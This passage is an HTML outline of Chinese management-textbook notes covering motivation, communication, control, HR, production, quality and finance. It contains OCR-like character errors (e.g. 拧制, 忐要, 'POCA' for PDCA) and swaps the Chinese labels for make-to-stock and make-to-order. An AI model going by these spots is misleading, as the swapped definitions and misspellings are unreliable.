<li>马斯洛的需要层次论  <img src = "2018_11_06_37.bmp"></li>
<li>赫茨伯格的双因素理论  <img src = "2018_11_06_38.bmp">
  * 为了实现这种激励，可以通过以下几种途径
      * 工作适应性
      * 工作的意义与挑战性
      * 工作的完整性或成果性
      * 工作的独立性
      * 工作扩大化
      * 工作丰富化</li>
<li>奥尔德弗的ERG 理论<ul>
<li>ERG 理论<ul>
<li>存在需要</li>
<li>关系需要</li>
<li>成长需要</li>
</ul>
</li>
<li>特点<ul>
<li>ERG 理论并不强调需要层次的顺序</li>
<li>ERG 理论认为，当较高级的需要受到挫折，未能得到满足时，会产生倒退现象，而不是像马斯洛所指出的那样，继续努力去追求受挫折需要的满足。</li>
<li>ERG 理论主张某种需要尤其是关系忐要和成长需要，在得到了基本满足之后，其强烈的程度不仅不会减弱，往往更为增强。这种情况与马斯洛所说的情况正好相反。</li>
</ul>
</li>
</ul>
</li>
<li>麦克利兰的高级需要理论<ul>
<li>权力需要</li>
<li>合群需要</li>
<li>成就需要</li>
</ul>
</li>
</ul>
</li>
<li>过程型激励理论<ul>
<li>期望理论</li>
<li>公平理论</li>
<li>强化理论  <img src = "2018_11_06_39.bmp"></li>
</ul>
</li>
<li>综合型激励理论  <img src = "2018_11_06_40.bmp"></li>
<li>激励理论的应用原则<ul>
<li>物质激励与精神激励相结合</li>
<li>外激励与内激励相结合</li>
<li>正激励与负激励相结合</li>
<li>个人目标与企业目标相结合</li>
<li>按需激励</li>
<li>民主公正</li>
</ul>
</li>
<li>精神激励的主要方式<ul>
<li>目标激励</li>
<li>感情激励</li>
<li>榜样激励</li>
<li>评比、竞赛、竞争激励</li>
<li>强化激励</li>
<li>领导行为激励</li>
<li>员工持股激励</li>
<li>危机激励</li>
<li>企业文化激励</li>
</ul>
</li>
</ul>
</li>
<li>沟通<ul>
<li>沟通的基本模式<ul>
<li>沟通的涵义</li>
<li>信息沟通的类型<ul>
<li>按信息流向划分：自上而下沟通、自下而上沟通、左右交叉沟通</li>
<li>按信息传递途径划分；正式沟通与非正式沟通</li>
<li>按信息传递方式划分： 口头沟通、书面沟通和非语吉沟通</li>
<li>按信息传递范闱划分：组织内部沟通和组织外部沟通</li>
</ul>
</li>
<li>沟通过程<ul>
<li>沟通主体</li>
<li>编码</li>
<li>媒体</li>
<li>沟通的客体</li>
<li>译码</li>
<li>反馈  <img src = "2018_11_06_41.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>沟通障碍与有效沟通<ul>
<li>沟通障碍<ul>
<li>自然原因造成的沟通障碍</li>
<li>管理因素造成的沟通障碍</li>
<li>技能因素造成的沟通障碍</li>
</ul>
</li>
<li>有效沟通的特征<ul>
<li>及时</li>
<li>充分</li>
<li>不失真</li>
</ul>
</li>
<li>有效沟通的原则<ul>
<li>明确沟通目的</li>
<li>信息的选择、生成要慎重</li>
<li>选择方便、快捷、节约、高效的传递方式</li>
<li>增强沟通技能</li>
<li>及时反馈</li>
</ul>
</li>
<li>沟通技巧<ul>
<li>说的技巧</li>
<li>写的技巧</li>
<li>倾听的技巧</li>
</ul>
</li>
</ul>
</li>
<li>冲突<ul>
<li>冲突的种类<ul>
<li>个体与个体冲突</li>
<li>个体与群体冲突</li>
<li>群体间冲突</li>
<li>组织内冲突</li>
<li>角色冲突</li>
<li>组织间冲突</li>
</ul>
</li>
<li>冲突处理策略<ul>
<li>回避策略<ul>
<li>不予注意</li>
<li>分开或隔离</li>
<li>限制相互作用</li>
</ul>
</li>
<li>缓解策略<ul>
<li>平滑</li>
<li>妥协</li>
</ul>
</li>
<li>正视策略<ul>
<li>面对面会议</li>
<li>角色互换</li>
<li>高层次目标</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第6章-管理的控制职能"><a href="#第6章-管理的控制职能" class="headerlink" title="第6章 管理的控制职能"></a>第6章 管理的控制职能</h3><ul>
<li>控制类型<ul>
<li>管理控制的目标与特点<ul>
<li>管理控制的概念</li>
<li>管理控制的目标<ul>
<li>限制偏差的累积</li>
<li>适应坏境的变化</li>
<li>处理组织内部的复杂局面</li>
<li>降低成本</li>
</ul>
</li>
<li>管理控制的特点<ul>
<li>整体性</li>
<li>动态性</li>
<li>能动性</li>
</ul>
</li>
</ul>
</li>
<li>控制的内容和控制的要求<ul>
<li>控制的内容<ul>
<li>对人员的控制</li>
<li>对财务的拧制</li>
<li>对作业的控制</li>
<li>对信息的拧制</li>
<li>对企业绩效的控制</li>
</ul>
</li>
<li>有效控制的要求<ul>
<li>目的性</li>
<li>全局性</li>
<li>时效性</li>
<li>经济性</li>
<li>关键控制点与例外情况</li>
</ul>
</li>
</ul>
</li>
<li>控制的类型<ul>
<li>反馈控制、实时控制与前馈控制</li>
<li>正式组织控制、非正式组织控制和自我控制</li>
<li>直接控制和间接控制</li>
</ul>
</li>
</ul>
</li>
<li>控制过程<ul>
<li>确定控制标准  <img src = "2018_11_06_42.bmp">
  <img src = "2018_11_06_43.bmp">
  * 标准的概念
  * 标准的分类
  * 选择关键控制点</li>
<li>衡量工作绩效<ul>
<li>如何衡量和衡量方法<ul>
<li>个人观察</li>
<li>统计报告（报表）</li>
<li>口头汇报</li>
<li>书面报告</li>
</ul>
</li>
<li>衡量什么</li>
<li>如何衡量<ul>
<li>衡量工作绩效是以预定标准为衡量依据的</li>
<li>衡量、检验、鉴证工作的方法</li>
<li>确定适量的衡量频度（衡量次数）</li>
<li>设立高效、有序的信息反馈系统</li>
</ul>
</li>
</ul>
</li>
<li>纠正偏差<ul>
<li>偏差分类<ul>
<li>正偏差</li>
<li>零偏差</li>
<li>负偏差</li>
</ul>
</li>
<li>寻找主因和寻找主要偏差</li>
<li>偏差产生原因<ul>
<li>标准错误。</li>
<li>标准制定时的假设前提和预测环境发生变化。</li>
<li>无合适的规程、工艺、指令等。</li>
<li>员工综合素质不合要求。</li>
<li>企业竞争力下降。</li>
<li>顾客爱好、忐求和市场情况发生变化。</li>
<li>前、后道工序发生变化。</li>
<li>劳动纪律、工作纪律有松懈现象等。</li>
</ul>
</li>
<li>确定纠偏对象<ul>
<li>企业的某项活动。</li>
<li>组织系统中某一环节、某一技术和某道工序。</li>
<li>组织某项活动的计划方案和衡量标准。</li>
<li>企业的外部环境、产品市场的某些条件等。</li>
</ul>
</li>
<li>选择适当的纠偏措施</li>
</ul>
</li>
</ul>
</li>
<li>控制技术与方法<ul>
<li>专项控制与综合控制<ul>
<li>审计法  <img src = "2018_11_06_44.bmp">
  * 财务审计
      * 审计检查方法
      * 审计调查法
      * 审计分析法
      * 抽样审计法
  * 业务审计
  * 管理审计</li>
<li>利润（损益）控制法</li>
<li>投资报酬率控制</li>
</ul>
</li>
<li>预算控制方法<ul>
<li>预算的概念</li>
<li>预算的种类<ul>
<li>传统预算</li>
<li>全面预算<ul>
<li>经营预算</li>
<li>财务预算</li>
<li>专门决策预算</li>
</ul>
</li>
<li>固定预算</li>
<li>弹性预算</li>
<li>零基预算</li>
<li>滚动预算</li>
<li>概率预算</li>
<li>长期预算</li>
<li>短期预算</li>
</ul>
</li>
<li>有效预算控制的要求<ul>
<li>要编好预算</li>
<li>高层管理部门要重视、支持并参与预算工作</li>
<li>确定各种标准</li>
<li>信息及时反馈</li>
</ul>
</li>
</ul>
</li>
<li>非预算控制方法<ul>
<li>现场观察</li>
<li>统计数据资料</li>
<li>专题报告法</li>
<li>本量利分析</li>
<li>财务报表分析<ul>
<li>变现能力比率</li>
<li>资产管理比率</li>
<li>负债比率</li>
<li>赢利能力比率</li>
</ul>
</li>
<li>目标管理</li>
<li>网络计划技术  <img src = "2018_11_06_45.bmp"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="第三篇、管理实务篇"><a href="#第三篇、管理实务篇" class="headerlink" title="第三篇、管理实务篇"></a>第三篇、管理实务篇</h2><h3 id="第7章-人力资源管理"><a href="#第7章-人力资源管理" class="headerlink" title="第7章 人力资源管理"></a>第7章 人力资源管理</h3><ul>
<li>人力资源管理概述<ul>
<li>人力资源的特点<ul>
<li>能动性</li>
<li>两重性</li>
<li>时效性</li>
<li>社会性</li>
</ul>
</li>
<li>人力资源管理思想的发展<ul>
<li>人力资源管理思想的发展  <img src = "2018_11_06_46.bmp"></li>
<li>人力资源管理的基本职能  <img src = "2018_11_06_47.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>员工招聘<ul>
<li>员工招聘程序<ul>
<li>招聘决策<ul>
<li>招聘决策应遵循下列原则：<ul>
<li>少而精原则</li>
<li>宁缺勿滥原则</li>
<li>公平竞争原则</li>
</ul>
</li>
<li>招聘决策的一般运作程序是：<ul>
<li>用人部门提出申请</li>
<li>人力资源管理部门复核</li>
<li>最高管理层决定</li>
</ul>
</li>
</ul>
</li>
<li>发布招聘信息<ul>
<li>广泛性</li>
<li>及时性</li>
<li>层次性</li>
</ul>
</li>
<li>招聘测试<ul>
<li>挑选合格的员工</li>
<li>让适当的人担任适当的工作</li>
<li>体现公平竞争原则</li>
</ul>
</li>
<li>人事决策<ul>
<li>重在工作能力</li>
<li>优先工作动机</li>
<li>不要用资历条件过高的人</li>
<li>当你对候选人缺乏足够信心时，不要将就</li>
<li>限制参加决策的人选，以避免难以协调意见</li>
<li>如经上述步骤仍无法确定人选，可再作一次测验</li>
</ul>
</li>
</ul>
</li>
<li>员工招聘渠道<ul>
<li>内部选拔<ul>
<li>内部提升</li>
<li>内部调用</li>
</ul>
</li>
<li>搜集网络信息<ul>
<li>熟人介绍</li>
<li>职业介绍机构</li>
<li>职业招聘人员</li>
<li>求职者登记</li>
</ul>
</li>
<li>公开招聘<ul>
<li>刊登广告</li>
<li>报名</li>
<li>招聘测试</li>
<li>筛选</li>
<li>录用</li>
<li>招聘评定  <img src = "2018_11_06_48.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>员工招聘测评<ul>
<li>知识考试</li>
<li>面试</li>
<li>心理测试<ul>
<li>要对个人的隐私加以保护</li>
<li>心理测试以前，要先做好预备工作</li>
<li>主试要事先作好充分的准备</li>
</ul>
</li>
<li>情景模拟<ul>
<li>公文处理</li>
<li>与人谈话<ul>
<li>电话谈话</li>
<li>接待来访者</li>
<li>拜访有关人士</li>
</ul>
</li>
<li>无领导小组讨论</li>
<li>角色扮演</li>
<li>即席发言</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>员工培训与开发<ul>
<li>培训与开发的重要性<ul>
<li>适应环境的变化</li>
<li>满足市场竞争的需要</li>
<li>满足员工自身发展的需要</li>
<li>提高企业的效益</li>
</ul>
</li>
<li>培训系统模型  <img src = "2018_11_06_49.bmp">
  * 培训需求的确定
      * 组织分祈
      * 工作分析
      * 个人分析
  * 培训目标的设置
      <img src = "2018_11_06_50.bmp">
  * 培训计划的拟定
  * 培训活动的实施
  * 总结评估</li>
<li>培训与开发的原则<ul>
<li>学以致用</li>
<li>技能和素质综合提高</li>
<li>全员培训和重点突出结合</li>
<li>提高培训的投入产出比  <img src = "2018_11_06_51.bmp"></li>
</ul>
</li>
<li>培训与开发的形式<ul>
<li>在职培训<ul>
<li>学徒制培训</li>
<li>工作指导培训</li>
<li>工作轮换</li>
<li>挂职锻炼</li>
<li>自学  <img src = "2018_11_06_52.bmp"></li>
</ul>
</li>
<li>脱产培训<ul>
<li>分层次脱产培训<ul>
<li>强调培训对象的职务地位、等级和层次</li>
<li>强调标准化、规范化培训</li>
<li>具有定期轮训的特性</li>
</ul>
</li>
<li>专业脱产培训<ul>
<li>强调培训的专业性</li>
<li>强调专业知识和技能的层次</li>
<li>强调培训的适应性和未来性  <img src = "2018_11_06_53.bmp"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>绩效考核<ul>
<li>绩效考核与管理的目的<ul>
<li>绩效的性质<ul>
<li>多因性  <img src = "2018_11_06_54.bmp"></li>
<li>多维性</li>
<li>动态性</li>
</ul>
</li>
<li>绩效考核与管理的目的<ul>
<li>检查和改进员工现有工作绩效</li>
<li>绩效考核是人员任用的依据</li>
<li>绩效考核是人员调配和职务升降的依据</li>
<li>绩效考核是人员培训的依据</li>
<li>绩效考核是确定员工报酬的依据</li>
<li>绩效考核是激励的依据，也是激励的手段</li>
</ul>
</li>
</ul>
</li>
<li>员工绩效考核的主要内容<ul>
<li>德。“德”，是评价考核员工的首要标准，具体包括政治品质、思想作风、个人品质和职业道德等</li>
<li>能。“能”，主要是指员工的能力，就是人的素质的外在表现，是一个人认识和改造世界的本领</li>
<li>勤。“勤”，主要反映员工的工作态度，包括纪律性、协调性、积极性和创造性等四个方面</li>
<li>绩。”绩”, 主要是指员工的工作业绩，是一个人为组织完成的工作数量、质量、经济效益和社会效益</li>
</ul>
</li>
<li>绩效考核的主要方法<ul>
<li>常规方法<ul>
<li>排序法</li>
<li>配对比较法</li>
<li>等级分配法</li>
</ul>
</li>
<li>行为评价法<ul>
<li>量表评等法</li>
<li>关键事件法</li>
<li>行为评等法</li>
<li>混合标准评等法</li>
</ul>
</li>
<li>原则<ul>
<li>最佳体现组织目标和考核目的；</li>
<li>对员工的工作起到开面引导和激励作用；</li>
<li>能比较客观地评价员ll作；</li>
<li>考核方法相对比较节约成本；</li>
<li>考核方法实践性强，易于执行。</li>
</ul>
</li>
</ul>
</li>
<li>绩效考核体系  <img src = "2018_11_06_55.bmp">
  * 直接主管考评
  * 同事互评
  * 下属考评
  * 相关部门或人员考评
  * 自我考评</li>
<li>影响绩效考核的因素<ul>
<li>绩效考评系统本身原因<ul>
<li>考评标准的信度问题</li>
<li>绩效考评中的效度问题</li>
<li>考评方法的选择</li>
<li>考评结果的反馈</li>
</ul>
</li>
<li>考评人员的原因<ul>
<li>以偏概全</li>
<li>评价尺度不统一</li>
<li>近因效应</li>
<li>第一印象</li>
<li>情感和偏见</li>
</ul>
</li>
<li>被考评人的原因</li>
</ul>
</li>
</ul>
</li>
<li>薪酬管理<ul>
<li>薪酬形式<ul>
<li>基本工资</li>
<li>激励工资<ul>
<li>投入激励工资</li>
<li>产出激励工资</li>
<li>长期激励</li>
</ul>
</li>
<li>福利<ul>
<li>非工作时间报酬<ul>
<li>工作日内的休息时间</li>
<li>每周休假</li>
<li>节假日</li>
<li>探亲假</li>
<li>年休假</li>
<li>事假</li>
</ul>
</li>
<li>津贴<ul>
<li>交通津贴</li>
<li>节日津贴</li>
<li>住房津贴</li>
<li>其他津贴</li>
</ul>
</li>
<li>服务</li>
</ul>
</li>
<li>社会保险<ul>
<li>养老保险</li>
<li>医疗保险</li>
<li>工伤保险</li>
<li>失业保险</li>
<li>生育保险</li>
</ul>
</li>
</ul>
</li>
<li>薪酬制度的设计<ul>
<li>建立合理薪酬制度的原则<ul>
<li>公平性<ul>
<li>外部公平性</li>
<li>内部公平性</li>
<li>个人公平性</li>
</ul>
</li>
<li>竞争性</li>
<li>激励性</li>
<li>经济性</li>
<li>合法性</li>
</ul>
</li>
<li>薪酬制度设计应考虑的因素<ul>
<li>内部因素<ul>
<li>劳动者的劳动</li>
<li>职务的高低</li>
<li>技术与训练水平</li>
<li>工作的时间性</li>
<li>工作的危险性</li>
<li>福利及优惠权利</li>
<li>年龄与工龄</li>
</ul>
</li>
<li>外部因素<ul>
<li>生活费用与物价水平</li>
<li>企业的负担能力</li>
<li>地区与行业间通行的薪酬水平</li>
<li>劳动力市场的供求状况</li>
<li>劳动力市场的潜在替代物</li>
<li>产品的需求弹性</li>
<li>风俗习惯</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第8章-生产与运作管理"><a href="#第8章-生产与运作管理" class="headerlink" title="第8章 生产与运作管理"></a>第8章 生产与运作管理</h3><ul>
<li>生产过程<ul>
<li>生产过程及其构成<ul>
<li>生产与生产过程的概念  <img src = "2018_11_06_56.bmp"></li>
<li>生产过程的构成<ul>
<li>生产技术准备过程</li>
<li>基本生产过程</li>
<li>辅助生产过程</li>
<li>生产服务过程  <img src = "2018_11_06_57.bmp"></li>
</ul>
</li>
<li>合理组织生产过程的基本要求<ul>
<li>连续性</li>
<li>平行性</li>
<li>比例性</li>
<li>均衡性</li>
<li>适应性</li>
</ul>
</li>
</ul>
</li>
<li>生产类型<ul>
<li>按产品需求特性划分<ul>
<li>订货型生产(Make - to - stock, MTS).</li>
<li>备货型生产(Make - to - order, MTO)</li>
</ul>
</li>
<li>按生产的工艺特征划分<ul>
<li>流程型生产</li>
<li>加工装配型生产</li>
</ul>
</li>
<li>按生产的重复性和稳定性划分<ul>
<li>大量生产</li>
<li>成批生产</li>
<li>单件生产  <img src = "2018_11_06_58.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>生产过程组织的基本形式<ul>
<li>工艺专业化</li>
<li>对象专业化</li>
</ul>
</li>
</ul>
</li>
<li>生产计划<ul>
<li>生产计划<ul>
<li>生产计划的三个层次<ul>
<li>综合计划<ul>
<li>产品</li>
<li>时间</li>
<li>人员</li>
</ul>
</li>
<li>主生产计划</li>
<li>物料需求计划</li>
</ul>
</li>
<li>生产计划的主要指标<ul>
<li>品种指标</li>
<li>质量指标</li>
<li>产量指标</li>
<li>产值指标<ul>
<li>商品产值</li>
<li>总产值</li>
<li>净产值</li>
</ul>
</li>
</ul>
</li>
<li>产品生产进度的安排<ul>
<li>大量大批生产企业产品生产进度的安排<ul>
<li>平均分配</li>
<li>分期递增</li>
<li>小幅度连续递增</li>
<li>抛物线形递增</li>
</ul>
</li>
<li>成批生产企业产品生产进度安排</li>
<li>单件小批生产企业产品生产进度安排</li>
</ul>
</li>
</ul>
</li>
<li>生产作业计划<ul>
<li>作业计划标准<ul>
<li>批量和生产间隔期</li>
<li>生产周期</li>
<li>生产提前期</li>
<li>在制品定额</li>
</ul>
</li>
<li>生产作业计划的编制<ul>
<li>在制品定额法</li>
<li>提前期法</li>
<li>生产周期法</li>
</ul>
</li>
</ul>
</li>
<li>物料需求计划和企业资源计划<ul>
<li>物料需求计划(MRP)</li>
<li>制造资源计划(MRPII)  <img src = "2018_11_06_59.bmp">
  * 计划的一贯性与可行性
  * 管理的系统性
  * 数据共享性
  * 动态应变性
  * 模拟预见性
  * 物流．资金流的统一</li>
<li>企业资源计划(ERP)<ul>
<li>体现对整个供应链资源进行管理的思想</li>
<li>体现精益生产、同步工程和敏捷制造的思想</li>
<li>体现事先计划与事中控制的思想</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>物资管理<ul>
<li>物资消耗定额<ul>
<li>净重</li>
<li>工艺性损耗</li>
<li>非工艺性损耗</li>
</ul>
</li>
<li>物资储备定额<ul>
<li>经常储备定额</li>
<li>保险储备定额</li>
<li>季节性储备定额。</li>
</ul>
</li>
<li>库存控制<ul>
<li>库存及库存控制的任务<ul>
<li>保障生产供应</li>
<li>控制生产系统的工作状态</li>
<li>降低生产成本</li>
</ul>
</li>
<li>库存控制的基本决策<ul>
<li>基本决策<ul>
<li>两次订货的间隔时间的确定</li>
<li>每次订货的订货批量的确定</li>
<li>每次订货提前期的确定</li>
<li>库存控制程度的确定，如满足用户需求的服务水平。库存控制决策的目标是在企业现有资源约束下，用最低的库存成本满足预期的需求。</li>
</ul>
</li>
<li>影响因素<ul>
<li>需求特性因素</li>
<li>订货提前期</li>
<li>自制与外购</li>
<li>服务水平</li>
</ul>
</li>
</ul>
</li>
<li>库存成本<ul>
<li>订货成本</li>
<li>调整成本</li>
<li>保管成本</li>
<li>购置成本</li>
<li>缺货成本</li>
</ul>
</li>
<li>库存控制的基本方式<ul>
<li>连续检查控制方式</li>
<li>周期检查控制方式</li>
</ul>
</li>
<li>库存重点控制方法——ABC 分析法<ul>
<li>A 类物料的库存控制方式</li>
<li>C 类物料的库存控制方式</li>
<li>B 类物料的库存控制方式</li>
</ul>
</li>
<li>经济订货批量模型  <img src = "2018_11_06_60.bmp"></li>
</ul>
</li>
<li>供应链管理  <img src = "2018_11_06_61.bmp"></li>
</ul>
</li>
<li>设备综合管理<ul>
<li>设备综合管理的涵义</li>
<li>设备购置的评价<ul>
<li>设备购置的技术性评价<ul>
<li>生产性</li>
<li>可靠性</li>
<li>维修性</li>
<li>安全性</li>
<li>节约性</li>
<li>环保性</li>
<li>成套性</li>
<li>适应性</li>
<li>耐用性</li>
</ul>
</li>
<li>设备购置的经济性评价<ul>
<li>投资回收期法</li>
<li>年费用法</li>
<li>现值法</li>
</ul>
</li>
</ul>
</li>
<li>设备磨损规律<ul>
<li>设备磨损<ul>
<li>有形磨损又称物理磨损</li>
<li>无形磨损又称精神磨损</li>
</ul>
</li>
<li>设备磨损规律  <img src = "2018_11_06_62.bmp"></li>
</ul>
</li>
<li>设备故障规律<ul>
<li>设备故障<ul>
<li>突发性故障</li>
<li>渐发性故障</li>
</ul>
</li>
<li>设备故障规律  <img src = "2018_11_06_63.bmp"></li>
</ul>
</li>
<li>设备的维护与修理<ul>
<li>设备的维护<ul>
<li>设备维护保养制度<ul>
<li>设各的日常维护保养</li>
<li>一级保养</li>
<li>二级保养</li>
</ul>
</li>
<li>点检制</li>
</ul>
</li>
<li>设备的修理<ul>
<li>设备修理类别<ul>
<li>小修</li>
<li>中修</li>
<li>大修</li>
</ul>
</li>
<li>设备维修制度<ul>
<li>计划预修制</li>
<li>计划保修制</li>
<li>预防维修制</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>设备更新<ul>
<li>设备寿命<ul>
<li>设备的物理寿命</li>
<li>设备的技术寿命</li>
<li>设备的经济寿命</li>
<li>设备的折旧寿命</li>
</ul>
</li>
<li>设备更新周期<ul>
<li>效能衰退</li>
<li>技术陈旧落后</li>
<li>资金成本</li>
</ul>
</li>
<li>设备更新的方式<ul>
<li>原型更新</li>
<li>技术更新</li>
</ul>
</li>
<li>设备的技术改造</li>
</ul>
</li>
</ul>
</li>
<li>先进生产系统<ul>
<li>准时制生产（JIT）<ul>
<li>采用变“推”为“拉”的“反工序法”</li>
<li>强调下“求”上“供”，准时生产．按时交付，避免积压</li>
</ul>
</li>
<li>精益生产方式（LP）<ul>
<li>以简化为手段去除生产中一切不增值的工作</li>
<li>强调人的作用，充分发挥人的潜力</li>
<li>采用适度自动化，提高生产系统的柔性</li>
<li>不断改进，以尽善尽美为最高目标</li>
</ul>
</li>
<li>敏捷制造（AM）<ul>
<li>从产品开发到产品生产周期的全过程满足用户要求</li>
<li>采用多变的动态组织结构</li>
<li>战略着眼点在于长期获取经济效益</li>
<li>建立新型的标准基础结构，实现技本、管理和人的集成</li>
<li>最大限度地调动、发挥人的作用</li>
</ul>
</li>
<li>计算机集成制造系统（CIMS）<ul>
<li>CIMS 的内涵</li>
<li>CIMS 的功能组成  <img src = "2018_11_06_64.bmp"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第9章-质量管理"><a href="#第9章-质量管理" class="headerlink" title="第9章 质量管理"></a>第9章 质量管理</h3><ul>
<li>质量管理概述<ul>
<li>质量管理的相关概念<ul>
<li>产品的概念</li>
<li>质量的定义</li>
</ul>
</li>
<li>质量成本<ul>
<li>预防成本</li>
<li>鉴定成本</li>
<li>内部缺陷成本</li>
<li>外部缺陷成本</li>
</ul>
</li>
<li>质量管理的发展<ul>
<li>质皇检验阶段</li>
<li>统计质量控制(Statistical Quality Control) 阶段</li>
<li>全面质量管理阶段  <img src = "2018_11_06_65.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>全面质量管理<ul>
<li>全面质量管理的特点<ul>
<li>全面质量管理的涵义</li>
<li>全面质量管理的特点<ul>
<li>全面质量管理的对象的全面性<ul>
<li>产品质量</li>
<li>工序质量</li>
<li>工作质量  <img src = "2018_11_06_66.bmp"></li>
</ul>
</li>
<li>全面质量管理的过桯的全面性</li>
<li>全面质量管理的全员性</li>
<li>全面质量管理方法的全面性</li>
</ul>
</li>
</ul>
</li>
<li>全面质量管理的基本观点<ul>
<li>一切为了用户</li>
<li>以预防为主</li>
<li>用数据说话</li>
</ul>
</li>
<li>全面质量管理的内容<ul>
<li>设计开发过程质量管理<ul>
<li>建立、健全产品设计的工作程序</li>
<li>建立早期预警系统</li>
<li>运用科学的设计方法</li>
</ul>
</li>
<li>生产制造过程质量管理<ul>
<li>做好质量检验工作</li>
<li>组织和促进文明生产</li>
<li>组织质量分析</li>
<li>加强工序的质量控制</li>
<li>建立完善的质量监控体系</li>
</ul>
</li>
<li>辅助生产过程的质量管理<ul>
<li>物资供应的质量管理</li>
<li>设备的质量管理</li>
<li>工装量仪的质量管理</li>
</ul>
</li>
<li>使用服务过程的质量管理<ul>
<li>开展对用户的技术服务工作</li>
<li>认真处理客户投诉问题</li>
<li>做好产品质量信息的反馈分析工作</li>
</ul>
</li>
</ul>
</li>
<li>QC小组与PDCA<ul>
<li>QC 小组<ul>
<li>组成小组，确定组长</li>
<li>命名</li>
<li>分析问题，确定主题</li>
<li>确立目标，采用”5W2H” 来确立目标</li>
<li>制定工作计划，内容包括工作内容，进度、负责人、效果评价、举措等</li>
<li>找出问题的主要方面和原因分析</li>
<li>提出对策</li>
<li>对策实施</li>
<li>效果评价，效果评价良好则进入下一步骤，如果效果评价不好回到(7), 重新提出对策。</li>
<li>效果维持</li>
<li>总结发表成果</li>
</ul>
</li>
<li>POCA 工作循环  <img src = "2018_11_06_67.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>ISO 9000系列标准<ul>
<li>ISO 9000系列标准的由来</li>
<li>ISO 9000系列标准的内容构成<ul>
<li>ISO 9000 族的核心标准  <img src = "2018_11_06_68.bmp"></li>
<li>与质量体系有关的基本术语  <img src = "2018_11_06_69.bmp"></li>
</ul>
</li>
<li>ISO 9000系列标准的适用性<ul>
<li>用千质量管理指南</li>
<li>合同清况，在第一方和第二方之间</li>
<li>第二方认定或注册</li>
<li>第三方认证或注册</li>
</ul>
</li>
<li>选择使用ISO 9000系列的两种方式<ul>
<li>受益者推动</li>
<li>管理者推动</li>
</ul>
</li>
<li>质量认证制度<ul>
<li>现代质量认证制度的由来</li>
<li>质量认证制度的含义<ul>
<li>产品和质量体系认证</li>
<li>认证机构的认可</li>
</ul>
</li>
<li>认证的要素和类型<ul>
<li>认证的要素<ul>
<li>型式试验</li>
<li>质量体系检查</li>
<li>监督检验</li>
<li>监督检查</li>
</ul>
</li>
<li>认证制度的分类<ul>
<li>自愿性认证和强制性认证</li>
<li>国家认证、区域认证和国际认证</li>
<li>合格标志认证和安全标志认证</li>
</ul>
</li>
<li>认证证书和认证标志</li>
</ul>
</li>
</ul>
</li>
<li>ISO 9000系列标准与TQM的关系</li>
</ul>
</li>
<li>质量管理的方法和技术<ul>
<li>统计分析表<ul>
<li>不合格项目表</li>
<li>缺陷位置表</li>
<li>不合格原因表</li>
<li>工序分布表</li>
<li>矩阵表</li>
</ul>
</li>
<li>分层法</li>
<li>排列图</li>
<li>因果分析图  <img src = "2018_11_06_70.bmp"></li>
<li>散布图<ul>
<li>散布图做法<ul>
<li>收集数据</li>
<li>画出坐标图x.y 轴，并标出刻度</li>
<li>描点</li>
<li>判断</li>
</ul>
</li>
<li>数据关系通常有6 种基本形式<ul>
<li>正强相关</li>
<li>弱正相关</li>
<li>强负相关</li>
<li>弱负相关</li>
<li>不相关</li>
<li>非线性相关</li>
</ul>
</li>
</ul>
</li>
<li>直方图<ul>
<li>报告产品质量情况</li>
<li>质量分祈</li>
<li>判断质量问题成因</li>
<li>调查工序和设备能力，合理安排生产计划</li>
<li>定期绘制并分布，有较强的视觉冲击，有利于提高员工质量意识</li>
</ul>
</li>
<li>控制图</li>
</ul>
</li>
</ul>
<h3 id="第10章-财务管理"><a href="#第10章-财务管理" class="headerlink" title="第10章 财务管理"></a>第10章 财务管理</h3><ul>
<li>财务观念<ul>
<li>财务与财务管理目标观念<ul>
<li>财务的概念</li>
<li>财务管理</li>
<li>财务管理目标</li>
</ul>
</li>
<li>资金时间价值观念<ul>
<li>资金时间价值的概念</li>
<li>资金时间价值的计算方法<ul>
<li>复利终值和复利现值</li>
<li>年金</li>
</ul>
</li>
</ul>
</li>
<li>投资风险价值观念<ul>
<li>投资风险</li>
<li>风险的种类<ul>
<li>经营风险</li>
<li>财务风险</li>
</ul>
</li>
<li>风险的衡量</li>
<li>风险与报酬虳关系</li>
</ul>
</li>
</ul>
</li>
<li>筹资管理<ul>
<li>资本金及资本金制度<ul>
<li>资本金</li>
<li>资本金制度<ul>
<li>法定资本金</li>
<li>资本金的筹集期限</li>
<li>资本金管理原则</li>
<li>资本积累与储备制度</li>
</ul>
</li>
</ul>
</li>
<li>企业筹资方式<ul>
<li>吸收直接投资</li>
<li>发行股票<ul>
<li>股票的种类<ul>
<li>普通股和优先股</li>
<li>国家股、法人股，个人股和外资股</li>
<li>发起人股和吐会公众股</li>
<li>A 股、B 股和H 股</li>
</ul>
</li>
<li>股票的价格形式<ul>
<li>票面价值</li>
<li>账面价值</li>
<li>发行价格</li>
<li>市场价值</li>
<li>清算价值</li>
</ul>
</li>
<li>股票发行价格的确定</li>
<li>发行股票筹资的特点</li>
</ul>
</li>
<li>内部积累</li>
<li>银行借款<ul>
<li>长期借款与短期借款</li>
<li>银行借款的信用条件</li>
</ul>
</li>
<li>发行债券<ul>
<li>公司债券的发行条件</li>
<li>公司债的发行方式<ul>
<li>公募发行</li>
<li>私募发行</li>
</ul>
</li>
<li>债券的价值形式</li>
<li>债券发行价格的确定</li>
<li>发行债券筹资的特点</li>
</ul>
</li>
<li>融资租赁<ul>
<li>租赁的含义和种类</li>
<li>融资租赁的形式<ul>
<li>直接租赁</li>
<li>杠杆租赁</li>
<li>售后租赁</li>
</ul>
</li>
<li>融资租赁的优缺点</li>
</ul>
</li>
<li>商业信用<ul>
<li>商业信用的形式<ul>
<li>应付账款</li>
<li>商业汇票</li>
<li>预收货款</li>
<li>票据贴现</li>
</ul>
</li>
<li>商业信用的优缺点</li>
